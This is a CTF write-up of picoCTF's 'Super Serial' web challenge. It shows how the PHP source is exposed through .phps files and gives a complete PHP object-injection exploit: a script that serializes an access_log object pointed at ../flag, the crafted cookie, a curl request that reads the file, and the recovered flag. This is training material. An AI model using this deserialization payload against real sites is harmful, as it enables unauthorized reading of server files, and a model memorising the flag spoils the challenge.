# Super Serial
Category: Web, 130 points

## Description

> Try to recover the flag stored on this website 
> 
> Hint: The flag is at ../flag

## Solution

The attached website just contains a username and password:

```html
<form class="form-signin" action="index.php" method="post">
	<div class="form-label-group">
		<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
		<label for="user">Username</label>
	</div>

	<div class="form-label-group">
		<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
		<label for="pass">Password</label>
	</div>

	<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
</form>
```

But if we visit `robots.txt` we get the following:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl http://mercury.picoctf.net:3449/robots.txt
User-agent: *
Disallow: /admin.phps
```

`phps` files are PHP source files. However, trying to visit `admin.phps`, we get an error:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl http://mercury.picoctf.net:3449/admin.phps
Not Found
```

Well, we do know at least that we have an `index.php`, shall we try `index.phps`?

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl -s http://mercury.picoctf.net:3449/index.phps
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
        $con = new SQLite3("../users.db");
        $username = $_POST["user"];
        $password = $_POST["pass"];
        $perm_res = new permissions($username, $password);
        if ($perm_res->is_guest() || $perm_res->is_admin()) {
                setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
                header("Location: authentication.php");
                die();
        } else {
                $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
        }
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
        <body>
                <div class="container">
                        <div class="row">
                                <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                                        <div class="card card-signin my-5">
                                                <div class="card-body">
                                                        <h5 class="card-title text-center">Sign In</h5>
                                                        <?php if (isset($msg)) echo $msg; ?>
                                                        <form class="form-signin" action="index.php" method="post">
                                                                <div class="form-label-group">
                                                                        <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
                                                                        <label for="user">Username</label>
                                                                </div>

                                                                <div class="form-label-group">
                                                                        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
                                                                        <label for="pass">Password</label>
                                                                </div>

                                                                <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
                                                        </form>
                                                </div>
                                        </div>
                                </div>
                        </div>
                </div>
        </body>
</html>
```

That's nice, the interesting part is:

```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
        $con = new SQLite3("../users.db");
        $username = $_POST["user"];
        $password = $_POST["pass"];
        $perm_res = new permissions($username, $password);
        if ($perm_res->is_guest() || $perm_res->is_admin()) {
                setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
                header("Location: authentication.php");
                die();
        } else {
                $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
        }
}
?>
```

In a similar manner, we can retrieve the sources for `cookie.php`:

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>

```

And for `authentication.php`:

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center"><?php echo $msg; ?></h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>

```

Now, in order to determine if the user is authorized to access the page, the server creates a `permissions` object from the provided username and password:

```php
$perm_res = new permissions($username, $password);
```

The object will return `is_admin() == TRUE` only if it can find a matching user in the database:

```php
function is_admin() {
		$admin = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
				if ($rest["admin"] == 1) {
						$admin = true;
				}
		}
		return $admin;
}
```

If so, the server caches the object in a cookie for the next time, by serializing it:

```php
setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
```

And next time, it reads the value directly from this cache:

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

This is actually very problematic. Since we control the cookie, we can provide a different serialized object and the server would unserialize it for us.

For example, we can use the `access_log` object:

```php
<?php

class access_log
{
    public $log_file;

    function __construct($lf) {
        $this->log_file = $lf;
    }

    function __toString() {
        return $this->read_log();
    }

    function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this->log_file);
    }
}

$perm_res = new access_log("../flag");
$perm_res_encoded =  urlencode(base64_encode(serialize($perm_res)));
echo $perm_res_encoded;
echo "\n";

?>
```

We instantiate an `access_log` object with `../flag`, which sets `$this->log_file = "../flag"`. Then we serialize the object and feed it to the server via the cookie.

The server will try to run:

```php
$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
$g = $perm->is_guest();
$a = $perm->is_admin();
```

The first line will create an `access_log` with `$this->log_file = "../flag"`, but the second line will throw an exception since this object doesn't have an `is_guest` method. What happens when the exception is thrown? It's caught by:

```php
catch(Error $e){
	die("Deserialization error. ".$perm);
}
```

This code prints an error message and appends the object to it, causing `access_log.__toString()` to be called:

```php
function __toString() {
	return $this->read_log();
}
```

Which in turn calls:

```php
function read_log() {
	return file_get_contents($this->log_file);
}
```

This should give us the flag.

Let's see it in action:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ php -e solve.php
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

We send this as the cookie and get:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl http://mercury.picoctf.net:3449/authentication.php -H "Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;"
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```

The flag: `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}`